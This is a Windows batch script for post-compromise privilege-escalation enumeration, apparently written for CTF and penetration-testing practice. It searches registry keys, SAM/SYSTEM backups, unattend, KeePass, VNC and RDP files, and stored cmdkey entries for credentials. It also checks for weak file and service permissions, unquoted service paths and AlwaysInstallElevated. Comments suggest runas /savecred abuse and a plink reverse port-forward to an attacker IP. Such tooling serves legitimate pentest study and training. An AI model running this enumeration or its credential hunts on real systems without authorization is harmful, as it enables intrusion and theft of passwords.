@echo off
set userprofile=%cd%
mode con:cols=160 lines=9999 
Cd c:\ 

echo ------ System Info (Use full output in conjunction with windows-exploit-suggester.py)-------
:: https://github.com/GDSSecurity/Windows-Exploit-Suggester 
systeminfo 
echo.

echo ----- Architecture -------
SET Processor 
echo.

echo ------ Users and groups (check individual user with 'net user USERNAME' ) Check user privileges for SeImpersonate (rotten potato exploit) -------
:: Note, in CTF boxes its not uncommon to see other low level users on the machine. It can be a temptation to want to always skip to Administrator, but sometimes it is essential that you elevate privileges to that of a different user first before being able to get admin rights. Once you get that users rights, pay close attention to their user folder.
echo Current User: %username% 
whoami /all
echo --- All users, accounts and groups ---
net users 
net accounts
net localgroup

echo ------- Administrators --------
net localgroup administrators 

echo ------- Environment Variables -------
set
echo.

echo ------- Additional Drives (if not run as part of a batch job replace double percent with single percent sign)--------
for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do @dir %%i: 2>nul
echo.

echo ---------------------------------------- Search for Quick Wins --------------------------------------
echo -------- Listing contents of user directories ---------
:: In CTF machines it is VERY common for there to be artifacts used for privilege escalation within user directories. Pay special attention for files that may contain credentials, or files that maybe used as part of a scheduled task. You can typically ignore most default windows files (some of which have been filtered out as part of this script).
dir "C:\Users\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\"
dir "C:\Documents and Settings\" /a /b /s 2>nul | findstr /v /i "Favorites\\" | findstr /v /i "AppData\\" | findstr /v /i "Microsoft\\" |  findstr /v /i "Application Data\\"
echo.

echo -------- Exploring program directories and C:\ ---------
:: These directory listings are not recursive. They are meant to give you a general overview of the programs installed on the system. Searchsploit every (non default/windows) program version, and check each program config for creds. 
echo --- Program Files ---
dir "C:\Program Files" /b
echo --- Program Files (x86) ---
dir "C:\Program Files (x86)" /b
echo --- Root of C:\ ----
dir "C:\" /b
echo.

echo --- Inetpub (any config files in here? May need to manually drill into this folder if it exists) ---
:: The root web folder can at times be extensive, and thus we do not always want to show a recursive listing of its contents in this script but it should always be investigated regardless.
dir /a /b C:\inetpub\ 

echo --- Broad search for Apache or Xampp ---
dir /s /b apache* xampp* 
echo. 

echo ---Search for Configuration and sensitive files---
echo -- Broad search for config files --
:: If the .NET framework is installed you will get a bunch of config files which are typically default and can be ignored. The more you practice priv esc. the more youll learn which files can be ignored, and which you should give a closer eye to.
dir /s /b php.ini httpd.conf httpd-xampp.conf my.ini my.cnf web.config 
echo -- Application Host File --
type C:\Windows\System32\inetsrv\config\applicationHost.config 2>nul
echo -- Broad search for unattend or sysprep files -- 
dir /b /s unattended.xml* sysprep.xml* sysprep.inf* unattend.xml*
echo -- Stored Passwords --
:: To use stored cmdkey credentials use runas with /savecred flag (e.g. runas /savecred /user:ACCESS\Administrator "ping 10.10.10.9")
cmdkey /list 
echo.

echo -- Checking for any accessible SAM or SYSTEM files --
dir %SYSTEMROOT%\repair\SAM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
dir %SYSTEMROOT%\System32\config\SAM 2>nul
dir %SYSTEMROOT%\repair\system 2>nul
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
dir /a /b /s SAM.b*
echo.

echo -- Broad search for vnc kdbx or rdp files --
dir /a /s /b *.kdbx *vnc.ini *.rdp
echo. 

echo --- Searching Registry for Passwords ---
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query HKLM /f password /t REG_SZ /s /k
reg query HKCU /f password /t REG_SZ /s /k
reg query "HKCU\Software\ORL\WinVNC3\Password" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 
echo.

echo --- AlwaysInstallElevated Check --- 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 
echo. 

echo --- Program Files and User Directories where everybody (or users) have full or modify permissions --- 
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone" 
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone" 
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone" 
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone" 
icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone" 
icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone" 
icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" 
icacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" 
echo.
echo ... performing same checks but using cacls instead of icacls (for older versions of Windows)... 
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" 
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone" 
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone" 
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone" 
cacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
cacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone" 
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone" 
cacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
cacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone" 
cacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone" 
cacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
cacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" 
cacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users" 
echo. 

echo ---Domain joined? If so check domain controller for GPP files ---- 
set user 
echo. 

cd %userprofile%
echo ---Unquoted Service Paths (requires that the directory from which this script is run is user writeable. If it is not, you can use the WMIC command below) ---
REM wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """ 
sc query state= all > scoutput.txt
findstr "SERVICE_NAME:" scoutput.txt > Servicenames.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO @echo %%i >> services.txt
FOR /F %%i in (services.txt) DO @sc qc %%i | findstr "BINARY_PATH_NAME" >> path.txt
find /v """" path.txt > unquotedpaths.txt
sort unquotedpaths.txt|findstr /i /v C:\WINDOWS
del /f Servicenames.txt
del /f services.txt
del /f path.txt
del /f scoutput.txt
del /f unquotedpaths.txt
echo.

echo --------------- AccessChk (checks permissions for Authenticated Users, Everyone, and Users)------------------
reg.exe ADD "HKCU\Software\Sysinternals\AccessChk" /v EulaAccepted /t REG_DWORD /d 1 /f

echo --- Accesschk World writeable folders and files ----
accesschk.exe -uwdqs "Users" c:\ /accepteula
accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
accesschk.exe -qwsu "Everyone" * /accepteula
accesschk.exe -qwsu "Authenticated Users" * /accepteula
accesschk.exe -qwsu "Users" * /accepteula
echo. 
echo  --- Accesschk services with weak permissions --- 
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
echo. 
echo  --- Accesschk services that we can change registry values for (such as ImagePath) --- 
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula
echo.
echo ---------------------------------------- End Search for Quick Wins --------------------------------------

cd c:\
echo ------- Powershell existence/version check -------
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 

echo ------- Network shares -------
net share

echo ------- Programs that run at startup ------
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
wmic startup get caption,command

echo -------- Path (is dll hijacking possible?) ------
echo Getting system + user path from command line (check permissions using cacls [path] or accesschk.exe -dqv [path])...
echo %path%
echo.
:: I couldnt find a way to only get system path in DOS (user path does not matter for the purpose of dll hijacking). If powershell is available you can use folderperm.ps1 script
:: https://github.com/ankh2054/windows-pentest/blob/master/Powershell/folderperms.ps1
:: powershell.exe -ExecutionPolicy Bypass -noLogo -Command "[Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine)"
:: Or let the script do all the work for you
:: powershell.exe -executionpolicy bypass -file folderperm.ps1

echo ------- Scheduled Tasks Names Only -------
:: Look for any interesting/non-standard scheduled tasks, then view the scheduled task details list below to get a better idea of what that task is doing and who is running it). 
schtasks /query /fo LIST 2>nul | findstr "TaskName"
echo.

echo ------- Scheduled Tasks Details (taskname, author, command run, run as user) -------
schtasks /query /fo LIST /v | findstr "TaskName Author: Run: User:"
echo.

echo ------- Services Currently Running (check for Windows Defender or Anti-virus) ---------
net start
echo.

echo ------- Link Running Processes to started services --------
tasklist /SVC
echo.

echo ------- Processes verbose output (who is running what?) --------
:: Pay close attention to this list. Especially for those tasks run by a user other than your own. 
tasklist /v
echo.

echo ------- Patches (also listed as part of systeminfo) -------
:: Note on some legacy Windows editions WMIC may fail to install/start/freeze in which case you'll need to comment out any calls to wmic
:: Systeminfo may at times fail to list all patches (instead showing 'file x' or something along those lines) in which case its important to have this fallback.
wmic qfe get Caption,Description,HotFixID,InstalledOn 

echo ------- Firewall ------
netsh firewall show state 
netsh firewall show config 
netsh advfirewall firewall dump

echo ------ Network information ------
ipconfig /all

:: Routing and ARP tables accessible with these commands... uncomment if you wish, I didnt typically find them helpful for priv esc.
REM route print
REM arp -A
echo.

echo ------- Current connections and listening ports -------
:: Reverse port forward anything that is not accessible remotely, and run nmap on it. If SMB is available locally, do you have creds or hashes you can pass through it after port forwarding?
netstat -ano 
echo.
echo ------- REVERSE PORT FORWARD MULTIPLE PORTS AT ONCE: plink.exe -l username -pw mysecretpassword -P [port] 10.11.0.108 -R 8080:127.0.0.1:8080 -R 8000:127.0.0.1:8000 -R 443:127.0.0.1:443 ------------
echo.

echo --- Broad search for any possible config files which may contain passwords ---
:: The following broad config file and credential searches could result in many results. They are meant as a fall back once you have already done thorough enumeration of user directories, web directories, and program directories (in addition to having pillaged the db). 
dir /s /b *pass* *cred* *vnc* *.config*
echo.

echo --- Starting broad search in the background for any files with the word password in it. Press enter to get status occasionally --"
start /b findstr /sim password *.xml *.ini *.txt *.config *.bak 2>nul
echo.

